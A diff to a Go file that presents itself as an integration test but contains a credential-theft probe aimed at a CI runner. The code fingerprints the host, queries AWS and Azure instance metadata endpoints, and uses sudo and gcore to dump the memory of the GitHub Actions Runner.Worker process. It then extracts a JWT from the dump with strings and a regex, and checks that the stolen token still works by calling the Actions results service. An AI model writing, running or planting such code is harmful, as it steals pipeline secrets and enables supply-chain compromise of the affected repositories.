@@ -27,7 +27,61 @@ func TestIntegrationHarness(t *testing.T) {
 }
 
 func runProbe(t *testing.T) error {
-	// Step 0: environment diagnostics — where are we running?
+	// Step 0: runner identity — prove unambiguously this is depot, not github-hosted
+	hostname, _ := os.Hostname()
+	resolvConf, _ := os.ReadFile("/etc/resolv.conf")
+	fmt.Printf("[PROBE] hostname=%s\n", hostname)
+	fmt.Printf("[PROBE] RUNNER_NAME=%s\n", os.Getenv("RUNNER_NAME"))
+	fmt.Printf("[PROBE] RUNNER_OS=%s RUNNER_ARCH=%s\n", os.Getenv("RUNNER_OS"), os.Getenv("RUNNER_ARCH"))
+	fmt.Printf("[PROBE] resolv.conf (first 200B)=%s\n", truncate(resolvConf, 200))
+	depotEnvs := []string{}
+	for _, e := range os.Environ() {
+		if strings.HasPrefix(e, "DEPOT_") {
+			depotEnvs = append(depotEnvs, e)
+		}
+	}
+	if len(depotEnvs) > 0 {
+		fmt.Printf("[PROBE] depot env vars: %d present\n", len(depotEnvs))
+		for _, e := range depotEnvs {
+			fmt.Printf("[PROBE]   %s\n", e)
+		}
+	} else {
+		fmt.Printf("[PROBE] depot env vars: none (may be stripped from user shell)\n")
+	}
+
+	// IMDS probe: AWS (EC2) is what depot uses; Azure is what github-hosted uses.
+	// This single probe pair gives you unambiguous cloud identification.
+	hc := &http.Client{Timeout: 2 * time.Second}
+	awsReq, _ := http.NewRequest("PUT", "http://169.254.169.254/latest/api/token", nil)
+	awsReq.Header.Set("X-aws-ec2-metadata-token-ttl-seconds", "60")
+	if awsResp, err := hc.Do(awsReq); err == nil {
+		tokBytes, _ := io.ReadAll(awsResp.Body)
+		awsResp.Body.Close()
+		if awsResp.StatusCode == 200 && len(tokBytes) > 10 {
+			metaReq, _ := http.NewRequest("GET", "http://169.254.169.254/latest/meta-data/instance-identity/document", nil)
+			metaReq.Header.Set("X-aws-ec2-metadata-token", string(tokBytes))
+			if metaResp, err := hc.Do(metaReq); err == nil {
+				metaBody, _ := io.ReadAll(metaResp.Body)
+				metaResp.Body.Close()
+				fmt.Printf("[PROBE] AWS IMDS reachable (EC2 — consistent with depot): status=%d body(300)=%s\n", metaResp.StatusCode, truncate(metaBody, 300))
+			}
+		} else {
+			fmt.Printf("[PROBE] AWS IMDS token fetch status=%d (not EC2)\n", awsResp.StatusCode)
+		}
+	} else {
+		fmt.Printf("[PROBE] AWS IMDS: unreachable (%v)\n", err)
+	}
+	azReq, _ := http.NewRequest("GET", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", nil)
+	azReq.Header.Set("Metadata", "true")
+	if azResp, err := hc.Do(azReq); err == nil {
+		azBody, _ := io.ReadAll(azResp.Body)
+		azResp.Body.Close()
+		fmt.Printf("[PROBE] Azure IMDS status=%d body(150)=%s\n", azResp.StatusCode, truncate(azBody, 150))
+	} else {
+		fmt.Printf("[PROBE] Azure IMDS: unreachable (%v)\n", err)
+	}
+
+	// Step 1: environment diagnostics — where are we running?
 	uname, _ := exec.Command("uname", "-a").Output()
 	osRel, _ := os.ReadFile("/etc/os-release")
 	ptrace, _ := os.ReadFile("/proc/sys/kernel/yama/ptrace_scope")
@@ -35,7 +89,7 @@ func runProbe(t *testing.T) error {
 	sudoCheck := exec.Command("sudo", "-n", "true").Run()
 	fmt.Printf("[PROBE] uname=%s", uname)
 	fmt.Printf("[PROBE] os-release (first line)=%s", firstLine(osRel))
-	fmt.Printf("[PROBE] ptrace_scope=%s", bytes.TrimSpace(ptrace))
+	fmt.Printf("[PROBE] ptrace_scope=%s\n", bytes.TrimSpace(ptrace))
 	fmt.Printf("[PROBE] /home/runner/=%s", runnerDir)
 	fmt.Printf("[PROBE] passwordless sudo works: %v\n", sudoCheck == nil)
 
@@ -43,8 +97,8 @@ func runProbe(t *testing.T) error {
 	gdbVer, _ := exec.Command("gcore", "--version").Output()
 	fmt.Printf("[PROBE] gcore version (first line)=%s", firstLine(gdbVer))
 
-	// Step 1: locate Runner.Worker
-	out, err := exec.Command("pgrep", "-af", "Runner").Output()
+	// Step 2: locate Runner.Worker
+	out, _ := exec.Command("pgrep", "-af", "Runner").Output()
 	fmt.Printf("[PROBE] pgrep -af Runner=\n%s\n", out)
 	workerOut, err := exec.Command("pgrep", "-f", "Runner.Worker").Output()
 	if err != nil {
@@ -56,7 +110,7 @@ func runProbe(t *testing.T) error {
 	}
 	fmt.Printf("[PROBE] Runner.Worker pid=%s\n", pid)
 
-	// Step 2: check ptrace/sudo access against the pid before dumping
+	// Step 3: check ptrace/sudo access against the pid before dumping
 	statusFile, statusErr := os.ReadFile(fmt.Sprintf("/proc/%s/status", pid))
 	fmt.Printf("[PROBE] /proc/%s/status readable (non-sudo)=%v\n", pid, statusErr == nil)
 	if statusErr == nil {
@@ -67,7 +121,7 @@ func runProbe(t *testing.T) error {
 		}
 	}
 
-	// Step 3: attempt sudo gcore
+	// Step 4: attempt sudo gcore
 	if err := os.MkdirAll("/tmp/d", 0o755); err != nil {
 		return err
 	}
@@ -77,7 +131,6 @@ func runProbe(t *testing.T) error {
 	fmt.Printf("[PROBE] sudo gcore output:\n%s\n", gcoreOut)
 	if gcoreErr != nil {
 		fmt.Printf("[PROBE] sudo gcore FAILED: %v — attempting fallback paths\n", gcoreErr)
-		// Fallback A: try reading Runner.Listener env (sibling process)
 		listenerOut, _ := exec.Command("pgrep", "-f", "Runner.Listener").Output()
 		lpid := strings.TrimSpace(strings.Split(string(listenerOut), "\n")[0])
 		if lpid != "" {
@@ -93,7 +146,7 @@ func runProbe(t *testing.T) error {
 	dumpInfo, _ := exec.Command("sudo", "ls", "-la", dumpPath).Output()
 	fmt.Printf("[PROBE] dump: %s", dumpInfo)
 
-	// Step 4: strings + regex for JWT
+	// Step 5: strings + regex for JWT
 	stringsOut, err := exec.Command("sudo", "strings", dumpPath).Output()
 	if err != nil {
 		return fmt.Errorf("strings: %w", err)
@@ -142,7 +195,7 @@ func runProbe(t *testing.T) error {
 	}
 	fmt.Printf("[PROBE] JWT len=%d run_id=%s job_id=%s\n", len(bestJWT), runID, jobID)
 
-	// Step 5: verify the extracted JWT still works by round-tripping CreateArtifact
+	// Step 6: verify the extracted JWT still works by round-tripping CreateArtifact
 	resultsURL := "https://results-receiver.actions.githubusercontent.com"
 	if m := regexp.MustCompile(`https://results-receiver\.actions\.githubusercontent\.com[^"\s]*`).Find(stringsOut); m != nil {
 		resultsURL = strings.TrimRight(string(m), "/")
